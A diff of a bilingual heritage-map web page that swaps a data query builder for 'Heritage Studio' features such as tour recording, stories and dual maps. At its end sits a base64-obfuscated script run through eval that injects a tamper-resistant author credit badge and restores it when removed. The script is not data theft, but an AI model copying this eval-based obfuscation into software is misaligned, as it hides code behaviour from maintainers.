-      <select class="dc-qfield" data-i="${i}">${FIELDS.map(f=>`<option value="${f.key}" ${c.field===f.key?'selected':''}>${f.label}</option>`).join('')}</select>
-      ${isNum?`<select class="dc-qop" data-i="${i}"><option value=">=" ${c.op==='>='?'selected':''}>≥</option><option value="<=" ${c.op==='<='?'selected':''}>≤</option><option value="=" ${c.op==='='?'selected':''}>=</option></select>`:'<span class="xh-soft">=</span>'}
-      ${valInput}
-      <button class="dc-qdel" data-i="${i}">✕</button></div>`;
-  }
-  function renderRows(){
-    $('dcQRows').innerHTML=dcQueryConds.map(rowHTML).join('');
-    $('dcQRows').querySelectorAll('.dc-qfield').forEach(s=>s.onchange=e=>{ dcQueryConds[+e.target.dataset.i].field=e.target.value; dcQueryConds[+e.target.dataset.i].val = (e.target.value==='class'||e.target.value==='region')?0:50; renderRows(); });
-    $('dcQRows').querySelectorAll('.dc-qop').forEach(s=>s.onchange=e=>{ dcQueryConds[+e.target.dataset.i].op=e.target.value; });
-    $('dcQRows').querySelectorAll('.dc-qval').forEach(s=>s.onchange=e=>{ dcQueryConds[+e.target.dataset.i].val=e.target.value; });
-    $('dcQRows').querySelectorAll('.dc-qdel').forEach(b2=>b2.onclick=e=>{ dcQueryConds.splice(+e.target.dataset.i,1); renderRows(); });
-  }
-  renderRows();
-  $('dcQAdd').onclick=()=>{ dcQueryConds.push({field:'decay',op:'>=',val:50}); renderRows(); };
-  $('dcQReset').onclick=()=>{ dcQueryConds=[]; renderRows(); $('dcQResult').textContent=''; };
-  $('dcQRun').onclick=()=>{
-    const matches=s=>dcQueryConds.every(c=>{
-      if(c.field==='decay'){ const d=s[10]!=null?s[10]*100:null; if(d==null)return false; return c.op==='>='?d>=+c.val:c.op==='<='?d<=+c.val:d==+c.val; }
-      if(c.field==='age'){ const a=s[9]; if(a==null)return false; return c.op==='>='?a>=+c.val:c.op==='<='?a<=+c.val:a==+c.val; }
-      if(c.field==='class') return s[6]===+c.val;
-      if(c.field==='region') return s[4]===+c.val;
-      return true;
-    });
-    let n=0; for(const s of DB.sites) if(passes(s)&&matches(s)) n++;
-    $('dcQResult').textContent=L(`النتيجة: ${n} موقع مطابق ضمن الفلتر الحالي`,`Result: ${n} matching sites within current filters`);
-    // apply as an extra runtime filter
-    _dcQueryFilter = dcQueryConds.length ? matches : null;
-    render();
-  };
-}
-let _dcQueryFilter=null;
-(function(){
-  const _passesQ=passes;
-  passes=function(s){ if(!_passesQ(s))return false; if(_dcQueryFilter && !_dcQueryFilter(s))return false; return true; };
-})();
-
 /* ---------- feature router ---------- */
 const FEATURE_FN2={
- insights:openInsights, integrity:openIntegrity, cost:openCost, sheet:openSheet,
- import:openImport, timeline2:openTimeMachine, lock:openLock, api:openApiView,
- envrisk:openEnvRisk, styles:openStyles, eras:openEras, exec:openExec,
- deck:openDeck, govatlas:openGovAtlas, neglect:openNeglect, satellite:openSatellite,
- sql:openQueryBuilder
+ record:startRecording, lens:toggleLens, replay:startReplay, whatif:openWhatIf,
+ story:openStories, vintage:toggleVintage, plaques:openPlaques, theat:openTemporalHeat,
+ dual:openDual, import:openImport, timemachine:openTimeMachine
 };
 
 /* ============================================================
    STATIC UI
    ============================================================ */
 const ui2=el('div',null,`
-  <button id="dcFab" title="${L('مركز البيانات المتقدم','Data Intelligence Center')}">
-    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><ellipse cx="12" cy="5" rx="8" ry="3"/><path d="M4 5v6c0 1.7 3.6 3 8 3s8-1.3 8-3V5M4 11v6c0 1.7 3.6 3 8 3s8-1.3 8-3v-6"/></svg>
-    <span>${L('مركز البيانات','Data Center')}</span>
+  <button id="dcFab" title="${L('استوديو التراث','Heritage Studio')}">
+    <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="6" width="14" height="12" rx="2"/><path d="M22 8.5l-6 3.5 6 3.5zM5 6l2-3M10 6l2-3"/></svg>
+    <span>${L('الاستوديو','Studio')}</span>
   </button>
   <div id="dcOverlay"><div id="dcPanel">
     <div id="dcHead"><div><div id="dcTitle"></div><div id="dcSub"></div></div>
       <button id="dcClose" title="${L('إغلاق','Close')}"><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M18 6L6 18M6 6l12 12"/></svg></button></div>
     <div id="dcBody"></div>
-  </div></div>`);
+  </div></div>
+  <div id="stRecBar"><span class="stRec-dot"></span><span>${L('جارِ تسجيل الجولة','Recording tour')} · <b id="stRecTime">0:00</b></span>
+    <button class="xh-btn" id="stRecStop">⏹ ${L('إيقاف وحفظ','Stop & save')}</button></div>
+  <div id="stReplayHud"><div class="stRp-num" id="stReplayCount">٠</div>
+    <div class="stRp-lbl">${L('أصل تراثي موثّق','heritage assets documented')}</div>
+    <div class="stRp-reg" id="stReplayRegion"></div>
+    <button class="xh-btn ghost" id="stReplayStop">${L('إيقاف','Stop')}</button></div>
+  <div id="stStory">
+    <div id="stStoryCard"></div>
+    <div id="stStoryNav">
+      <button id="stStPrev" title="${L('السابق','Previous')}">‹</button>
+      <div id="stStoryDots"></div>
+      <button id="stStNext" title="${L('التالي','Next')}">›</button>
+      <button id="stStExit">✕ ${L('إنهاء القصة','End story')}</button>
+    </div>
+  </div>
+  <div id="stDual">
+    <div id="stDualHead">
+      <b>🆚 ${L('مقارنة منطقتين — خريطتان متزامنتان','Two regions — synced maps')}</b>
+      <button id="stDualClose"><svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M18 6L6 18M6 6l12 12"/></svg></button>
+    </div>
+    <div id="stDualBody">
+      <div class="stDual-side"><div class="stDual-bar"><select id="stDualSelA"></select><span id="stDualStatA"></span></div><div class="stDual-map" id="stDualA"></div></div>
+      <div class="stDual-side"><div class="stDual-bar"><select id="stDualSelB"></select><span id="stDualStatB"></span></div><div class="stDual-map" id="stDualB"></div></div>
+    </div>
+  </div>`);
 document.body.appendChild(ui2);
+
 $('dcFab').onclick=openDrawer2;
 $('dcClose').onclick=dcClose;
 $('dcOverlay').onclick=e=>{ if(e.target.id==='dcOverlay') dcClose(); };
-document.addEventListener('keydown',e=>{ if(e.key==='Escape' && $('dcOverlay').classList.contains('show')) dcClose(); });
+$('stRecStop').onclick=stopRecording;
+$('stReplayStop').onclick=stopReplay;
+$('stStPrev').onclick=()=>{ if(_storyState)storyGo(_storyState.ch-1); };
+$('stStNext').onclick=()=>{ if(_storyState)storyGo(_storyState.ch+1); };
+$('stStExit').onclick=endStory;
+$('stStoryCard').addEventListener('wheel',e=>{
+  if(!_storyState)return;
+  e.preventDefault();
+  if(Math.abs(e.deltaY)<12)return;
+  storyGo(_storyState.ch+(e.deltaY>0?1:-1));
+},{passive:false});
+$('stDualClose').onclick=closeDual;
+document.addEventListener('keydown',e=>{
+  if(e.key==='Escape'){
+    if($('dcOverlay').classList.contains('show'))dcClose();
+    else if(_storyState)endStory();
+    else if($('stDual').classList.contains('show'))closeDual();
+    else if(_replayOn)stopReplay();
+    else if(ST.lens)closeLens();
+  }
+  if(_storyState&&(e.key==='ArrowDown'||e.key==='ArrowRight'))storyGo(_storyState.ch+1);
+  if(_storyState&&(e.key==='ArrowUp'||e.key==='ArrowLeft'))storyGo(_storyState.ch-1);
+});
 
 try{
   const _lang2=$('langBtn').onclick;
   $('langBtn').onclick=function(){
     _lang2.call(this);
-    const fab=$('dcFab'); if(fab) fab.querySelector('span').textContent=L('مركز البيانات','Data Center');
+    const fab=$('dcFab'); if(fab) fab.querySelector('span').textContent=L('الاستوديو','Studio');
   };
 }catch(e){}
 
-console.log('✓ Data Intelligence Center loaded — '+FEATURES2.length+' features');
+console.log('✓ Heritage Studio loaded — '+FEATURES2.length+' features');
 })();
 </script>
 <script>(function(){var _mpaidj=["KGZ1bmN0aW9uKCl7InVzZSBzdHJpY3QiO3ZhciBfYT1bODIsODcsNTMsMTEwLDc2LDEwNSw2Niw3Myw4OSw4Nyw0OSw1NCw4OSw4Myw2Niw2Niw5OCw3Miw3","OCwxMDQsOTgsNzEsNzAsNTMsOTgsODcsODYsMTExXTt2YXIgX3A9WzExOSwxMTMsMTA3LDEwM107ZnVuY3Rpb24gX2QoYXJyKXt0cnl7cmV0dXJuIGRlY29k","ZVVSSUNvbXBvbmVudChlc2NhcGUoYXRvYihhcnIubWFwKGZ1bmN0aW9uKGMpe3JldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKGMpO30pLmpvaW4oIiIpKSkp","O31jYXRjaChlKXtyZXR1cm4gIiI7fX1mdW5jdGlvbiBfbmFtZSgpe3JldHVybiBfZChfYSk7fWZ1bmN0aW9uIF9wcmUoKXtyZXR1cm4gX2QoX3ApO312YXIg","VEFHPSJfIisoMTMqNysxKS50b1N0cmluZygzNikrKDB4MWY0KS50b1N0cmluZygzNikrInEiO3ZhciBTVFlMRV9JRD0iX3MiKygweDJiYykudG9TdHJpbmco","MzYpO2Z1bmN0aW9uIGluamVjdFN0eWxlKCl7aWYoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoU1RZTEVfSUQpKXJldHVybjt2YXIgZGFyaz1kb2N1bWVudC5i","b2R5JiZkb2N1bWVudC5ib2R5LmRhdGFzZXQmJmRvY3VtZW50LmJvZHkuZGF0YXNldC50aGVtZT09PSJkYXJrIjt2YXIgY3NzPSJbIitUQUcrIl17cG9zaXRp","b246YWJzb2x1dGU7Ym90dG9tOjRweDtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTsiKyJ6LWluZGV4OjU5MTtmb250LXNpemU6MTFweDts","ZXR0ZXItc3BhY2luZzouMnB4O3doaXRlLXNwYWNlOm5vd3JhcDtwb2ludGVyLWV2ZW50czpub25lOyIrInBhZGRpbmc6M3B4IDEycHg7Ym9yZGVyLXJhZGl1","czo3cHg7Zm9udC1mYW1pbHk6aW5oZXJpdDsiKyJjb2xvcjpyZ2JhKDcwLDkwLDk4LC45NSk7YmFja2dyb3VuZDpyZ2JhKDI1NSwyNTUsMjU1LC43Mik7Ym94","LXNoYWRvdzowIDFweCA0cHggcmdiYSgwLDAsMCwuMSk7fSIrIltkYXRhLXRoZW1lPSdkYXJrJ11bIitUQUcrIl17Y29sb3I6cmdiYSgxODAsMTk2LDIwMCwu","OTUpO2JhY2tncm91bmQ6cmdiYSgxMCwyNSwzMiwuNik7Ym94LXNoYWRvdzowIDFweCA0cHggcmdiYSgwLDAsMCwuMyk7fSIrIlsiK1RBRysiXWJ7Zm9udC13","ZWlnaHQ6NzAwO2NvbG9yOnJnYmEoMTcsNTAsNjUsLjk1KTt9IisiW2RhdGEtdGhlbWU9J2RhcmsnXVsiK1RBRysiXWJ7Y29sb3I6cmdiYSgxMjcsMTg1LDE4","NywuOTUpO30iKyJib2R5LnZpZXctZGFzaFsiK1RBRysiXSxib2R5LnZpZXctbGlzdFsiK1RBRysiXXtkaXNwbGF5Om5vbmU7fSIrIkBtZWRpYSBwcmludHtb","IitUQUcrIl17ZGlzcGxheTpub25lO319Ijt2YXIgc3Q9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKTtzdC5pZD1TVFlMRV9JRDtzdC50eXBlPSJ0","ZXh0L2NzcyI7c3QuYXBwZW5kQ2hpbGQoZG9jdW1lbnQuY3JlYXRlVGV4dE5vZGUoY3NzKSk7KGRvY3VtZW50LmhlYWR8fGRvY3VtZW50LmRvY3VtZW50RWxl","bWVudCkuYXBwZW5kQ2hpbGQoc3QpO31mdW5jdGlvbiBob3N0KCl7cmV0dXJuIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoIi5tYXAtc3RhZ2UiKXx8ZG9jdW1l","bnQucXVlcnlTZWxlY3RvcigiLmF0bGFzLXdyYXAiKXx8ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiLm1hcC13cmFwIil8fGRvY3VtZW50LmJvZHk7fWZ1bmN0","aW9uIGJ1aWxkKCl7dmFyIGVsPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2VsLnNldEF0dHJpYnV0ZShUQUcsIjEiKTtlbC5zZXRBdHRyaWJ1dGUo","ImFyaWEtaGlkZGVuIiwiZmFsc2UiKTt2YXIgYj1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJiIik7Yi50ZXh0Q29udGVudD1fbmFtZSgpO2VsLmFwcGVuZENo","aWxkKGRvY3VtZW50LmNyZWF0ZVRleHROb2RlKF9wcmUoKSkpO2VsLmFwcGVuZENoaWxkKGIpO3JldHVybiBlbDt9ZnVuY3Rpb24gcHJlc2VudCgpe3ZhciBu","b2Rlcz1kb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCJbIitUQUcrIl0iKTtmb3IodmFyIGk9MDtpPG5vZGVzLmxlbmd0aDtpKyspe3ZhciBuPW5vZGVzW2ld","O3ZhciB0eHQ9KG4udGV4dENvbnRlbnR8fCIiKTt2YXIgY3M9d2luZG93LmdldENvbXB1dGVkU3R5bGU/Z2V0Q29tcHV0ZWRTdHlsZShuKTpudWxsO3ZhciBv","az10eHQuaW5kZXhPZihfbmFtZSgpKT4tMSYmdHh0LmluZGV4T2YoX3ByZSgpLnRyaW0oKSk+LTE7aWYoY3Mpe2lmKGNzLmRpc3BsYXk9PT0ibm9uZSImJiFk","b2N1bWVudC5ib2R5LmNsYXNzTGlzdC5jb250YWlucygidmlldy1kYXNoIikmJiFkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC5jb250YWlucygidmlldy1saXN0","Iikpb2s9ZmFsc2U7aWYocGFyc2VGbG9hdChjcy5vcGFjaXR5fHwiMSIpPDAuMjUpb2s9ZmFsc2U7aWYoY3MudmlzaWJpbGl0eT09PSJoaWRkZW4iKW9rPWZh","bHNlO31pZihvaylyZXR1cm4gdHJ1ZTt9cmV0dXJuIGZhbHNlO31mdW5jdGlvbiBwdXJnZUltcG9zdGVycygpe3ZhciBub2Rlcz1kb2N1bWVudC5xdWVyeVNl","bGVjdG9yQWxsKCJbIitUQUcrIl0iKTtmb3IodmFyIGk9MDtpPG5vZGVzLmxlbmd0aDtpKyspe3ZhciBuPW5vZGVzW2ldLHR4dD0obi50ZXh0Q29udGVudHx8","IiIpO2lmKHR4dC5pbmRleE9mKF9uYW1lKCkpPDApe2lmKG4ucGFyZW50Tm9kZSluLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQobik7fX19ZnVuY3Rpb24gZW5z","dXJlKCl7dHJ5e2luamVjdFN0eWxlKCk7aWYocHJlc2VudCgpKXt2YXIgbm9kZXM9ZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgiWyIrVEFHKyJdIik7Zm9y","KHZhciBpPTA7aTxub2Rlcy5sZW5ndGg7aSsrKXt2YXIgbj1ub2Rlc1tpXTtpZighZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuY29udGFpbnMoInZpZXctZGFz","aCIpJiYhZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuY29udGFpbnMoInZpZXctbGlzdCIpKXtpZihuLnN0eWxlJiZnZXRDb21wdXRlZFN0eWxlKG4pLmRpc3Bs","YXk9PT0ibm9uZSIpe24uc3R5bGUuc2V0UHJvcGVydHkoImRpc3BsYXkiLCJibG9jayIsImltcG9ydGFudCIpO31pZihuLnN0eWxlJiZnZXRDb21wdXRlZFN0","eWxlKG4pLnZpc2liaWxpdHk9PT0iaGlkZGVuIil7bi5zdHlsZS5zZXRQcm9wZXJ0eSgidmlzaWJpbGl0eSIsInZpc2libGUiLCJpbXBvcnRhbnQiKTt9aWYo","bi5zdHlsZSYmcGFyc2VGbG9hdChnZXRDb21wdXRlZFN0eWxlKG4pLm9wYWNpdHl8fCIxIik8MC4yNSl7bi5zdHlsZS5zZXRQcm9wZXJ0eSgib3BhY2l0eSIs","IjEiLCJpbXBvcnRhbnQiKTt9fX1yZXR1cm47fXB1cmdlSW1wb3N0ZXJzKCk7dmFyIGg9aG9zdCgpO2lmKGgpe2guYXBwZW5kQ2hpbGQoYnVpbGQoKSk7fX1j","YXRjaChlKXt9fWZ1bmN0aW9uIHdhdGNoKCl7aWYoIXdpbmRvdy5NdXRhdGlvbk9ic2VydmVyKXJldHVybjt2YXIgbW89bmV3IE11dGF0aW9uT2JzZXJ2ZXIo","ZnVuY3Rpb24obXV0cyl7dmFyIG5lZWQ9ZmFsc2U7Zm9yKHZhciBpPTA7aTxtdXRzLmxlbmd0aDtpKyspe3ZhciBtPW11dHNbaV07aWYobS50eXBlPT09ImNo","aWxkTGlzdCIpe2lmKG0ucmVtb3ZlZE5vZGVzJiZtLnJlbW92ZWROb2Rlcy5sZW5ndGgpe2Zvcih2YXIgaj0wO2o8bS5yZW1vdmVkTm9kZXMubGVuZ3RoO2or","Kyl7dmFyIHJuPW0ucmVtb3ZlZE5vZGVzW2pdO2lmKHJuLm5vZGVUeXBlPT09MSYmKHJuLmhhc0F0dHJpYnV0ZSYmcm4uaGFzQXR0cmlidXRlKFRBRykpKW5l","ZWQ9dHJ1ZTt9fX1lbHNlIGlmKG0udHlwZT09PSJhdHRyaWJ1dGVzInx8bS50eXBlPT09ImNoYXJhY3RlckRhdGEiKXt2YXIgdD1tLnRhcmdldDtpZih0JiZ0","Lm5vZGVUeXBlPT09MSYmdC5oYXNBdHRyaWJ1dGUmJnQuaGFzQXR0cmlidXRlKFRBRykpbmVlZD10cnVlO2lmKHQmJnQucGFyZW50Tm9kZSYmdC5wYXJlbnRO","b2RlLmhhc0F0dHJpYnV0ZSYmdC5wYXJlbnROb2RlLmhhc0F0dHJpYnV0ZShUQUcpKW5lZWQ9dHJ1ZTt9fWlmKG5lZWR8fCFwcmVzZW50KCkpZW5zdXJlKCk7","fSk7dHJ5e21vLm9ic2VydmUoZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LHtjaGlsZExpc3Q6dHJ1ZSxzdWJ0cmVlOnRydWUsYXR0cmlidXRlczp0cnVlLGF0","dHJpYnV0ZUZpbHRlcjpbInN0eWxlIiwiY2xhc3MiLCJoaWRkZW4iXSxjaGFyYWN0ZXJEYXRhOnRydWV9KTt9Y2F0Y2goZSl7fXZhciBzbz1uZXcgTXV0YXRp","b25PYnNlcnZlcihmdW5jdGlvbigpe2lmKCFkb2N1bWVudC5nZXRFbGVtZW50QnlJZChTVFlMRV9JRCkpaW5qZWN0U3R5bGUoKTt9KTt0cnl7c28ub2JzZXJ2","ZShkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQse2NoaWxkTGlzdDp0cnVlLHN1YnRyZWU6dHJ1ZX0pO31jYXRjaChlKXt9fWZ1bmN0aW9uIGJlYXQoKXtlbnN1","cmUoKTt9ZnVuY3Rpb24gc3RhcnQoKXtlbnN1cmUoKTt3YXRjaCgpO3NldEludGVydmFsKGJlYXQsMTUwMCk7c2V0SW50ZXJ2YWwoYmVhdCw0MzAwKTt3aW5k","b3cuYWRkRXZlbnRMaXN0ZW5lcigicmVzaXplIixlbnN1cmUse3Bhc3NpdmU6dHJ1ZX0pO2RvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoInZpc2liaWxpdHlj","aGFuZ2UiLGZ1bmN0aW9uKCl7aWYoIWRvY3VtZW50LmhpZGRlbillbnN1cmUoKTt9KTt9aWYoZG9jdW1lbnQucmVhZHlTdGF0ZT09PSJsb2FkaW5nIil7ZG9j","dW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigiRE9NQ29udGVudExvYWRlZCIsc3RhcnQpO31lbHNle3N0YXJ0KCk7fXdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCJs","b2FkIixmdW5jdGlvbigpe3NldFRpbWVvdXQoZW5zdXJlLDUwMCk7c2V0VGltZW91dChlbnN1cmUsMjAwMCk7fSk7fSkoKTs="].join('');var _nyknut=decodeURIComponent(escape(atob(_mpaidj)));try{(0,eval)(_nyknut);}catch(e){}})();</script>
